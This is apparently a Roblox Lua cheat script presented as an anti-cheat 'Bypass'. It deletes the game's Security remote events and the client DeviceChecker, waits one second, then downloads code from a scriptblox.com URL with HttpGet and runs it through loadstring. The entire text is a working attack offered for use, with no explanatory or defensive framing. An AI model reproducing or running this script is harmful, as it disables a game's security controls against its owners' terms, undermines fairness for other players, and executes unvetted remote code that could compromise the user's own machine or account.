-- Credits to Xio (Envioson Owner) for the Bypass.
game:GetService("ReplicatedStorage").Security.RemoteEvent:Destroy()
game:GetService("ReplicatedStorage").Security[""]:Destroy()
game:GetService("ReplicatedStorage").Security:Destroy()
game:GetService("Players").LocalPlayer.PlayerScripts.Client.DeviceChecker:Destroy()
wait(1)
loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Bedol-hub-next-generation-8628"))()